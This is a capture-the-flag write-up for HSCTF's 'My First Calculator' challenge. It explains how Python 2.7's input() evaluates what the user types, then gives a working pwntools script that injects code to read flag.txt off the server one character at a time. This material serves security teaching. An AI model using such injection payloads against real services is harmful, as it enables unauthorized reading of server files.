# My First Calculator

## Description

I'm really new to python. Please don't break my calculator!

nc misc.hsctf.com 7001

There is a flag.txt on the server.

## Solution

We're given python source code for a calculator app running on the server.

```py
#!/usr/bin/env python2.7

try:
    print("Welcome to my calculator!")
    print("You can add, subtract, multiply and divide some numbers")

    print("")

    first = int(input("First number: "))
    second = int(input("Second number: "))

    operation = str(raw_input("Operation (+ - * /): "))

    if first != 1 or second != 1:
        print("")
        print("Sorry, only the number 1 is supported")

    if first == 1 and second == 1 and operation == "+":
        print("1 + 1 = 2")
    if first == 1 and second == 1 and operation == "-":
        print("1 - 1 = 0")
    if first == 1 and second == 1 and operation == "*":
        print("1 * 1 = 1")
    if first == 1 and second == 1 and operation == "/":
        print("1 / 1 = 1")
    else:
        print(first + second)
except ValueError:
    pass
```

Notably, the script is explicitly meant to run in python 2.7 and uses the vulnerable ```input()``` function.
We can use this to execute arbitrary code on the server, as long as it returns a valid integer.

This will not satisfy the condition that both inputs are 1, but that doesnt matter as it will default to printing the sum of our arguments.
We can simply enter 0 as our second argument to have it print the value of the first argument alone.

We're told in the description that there is a flag file on the server.
We can write a script to read this file character by character, using the ```ord()``` function to convert these to integers.
From these values, we can reconstruct the flag, one character at a time.

## Exploit Script

```py
#!/usr/bin/python
from pwn import *

flag = ''
i = 0
win = False

while not win:
    payload = 'ord(open("flag.txt").read()[' + str(i) + '])'
    conn = remote('misc.hsctf.com', 7001)
    conn.recvuntil(':')
    conn.send(payload + '\n')
    conn.recvuntil(':')
    conn.send("0\n")
    conn.recvuntil(':')
    conn.send("+\n")
    conn.recvuntil('supported\n')
    character = chr(int(conn.recvline().decode()))
    conn.close()
    flag += character
    if character == '}':
        win = True
    else:
        i += 1

f = open("flag.txt", "w")
f.write(flag)
f.close()
```

## Flag

```flag{please_use_python3}```

